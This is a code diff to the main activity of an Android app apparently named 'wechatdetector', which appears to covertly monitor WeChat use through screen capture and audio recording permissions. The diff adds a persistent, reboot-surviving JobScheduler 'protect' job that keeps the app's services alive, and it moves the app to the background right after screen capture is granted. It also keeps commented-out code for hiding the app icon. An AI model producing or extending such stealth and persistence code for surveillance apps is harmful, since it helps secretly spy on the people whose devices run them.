@@ -2,8 +2,13 @@ package com.zou.wechatdetector.activity;
 
 import android.Manifest;
 import android.app.Activity;
+import android.app.job.JobInfo;
+import android.app.job.JobScheduler;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.PackageManager;
 import android.media.projection.MediaProjectionManager;
 import android.net.ConnectivityManager;
 import android.os.Build;
@@ -11,12 +16,15 @@ import android.os.Bundle;
 import android.provider.Settings;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
+import android.util.Log;
 import android.widget.Toast;
 
 import com.zhy.m.permission.MPermissions;
 import com.zhy.m.permission.PermissionDenied;
 import com.zhy.m.permission.PermissionGrant;
-import com.zou.wechatdetector.receiver.MyBroadCastReceiver;
+
+import com.zou.wechatdetector.BuildConfig;
+import com.zou.wechatdetector.service.JobProtectService;
 import com.zou.wechatdetector.service.MainService;
 import com.zou.wechatdetector.service.ProtectService;
 import com.zou.wechatdetector.utils.Tools;
@@ -36,6 +44,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(@Nullable Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        Toast.makeText(this, BuildConfig.WECHAT_USER_NAME,Toast.LENGTH_SHORT).show();
         initData();
         //1.请求常规权限
         requestRecordPermission();
@@ -48,9 +57,27 @@ public class MainActivity extends Activity {
         }else {
             startService(intent);
         }
+        Log.i(TAG,"onCreate");
         //启动守护进程
-        Intent portectService = new Intent(this,ProtectService.class);
-        startService(portectService);
+//        Intent portectService = new Intent(this,ProtectService.class);
+//        startService(portectService);
+        JobScheduler jobScheduler = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
+        jobScheduler.cancelAll();
+        JobInfo.Builder builder = new JobInfo.Builder(1024, new ComponentName(getPackageName(), JobProtectService.class.getName()));
+
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            //android N之后时间必须在15分钟以上
+//            builder.setMinimumLatency(10 * 1000);
+            builder.setPeriodic(15 * 60 * 1000);
+        }else{
+            builder.setPeriodic(60 * 1000);
+        }
+        builder.setPersisted(true);
+        builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
+        int schedule = jobScheduler.schedule(builder.build());
+        if (schedule <= 0) {
+            Log.w(TAG, "schedule error！");
+        }
     }
 
     private void initData() {
@@ -115,6 +142,7 @@ public class MainActivity extends Activity {
             case REQUEST_CODE_SCREEN_CAPTURE:
                 if(resultCode == RESULT_OK) {
                     EventBus.getDefault().post(data);
+                    moveTaskToBack(true);
                     // 将app图标隐藏：
 //                    PackageManager p = getPackageManager();
 //                    p.setComponentEnabledSetting(getComponentName(),
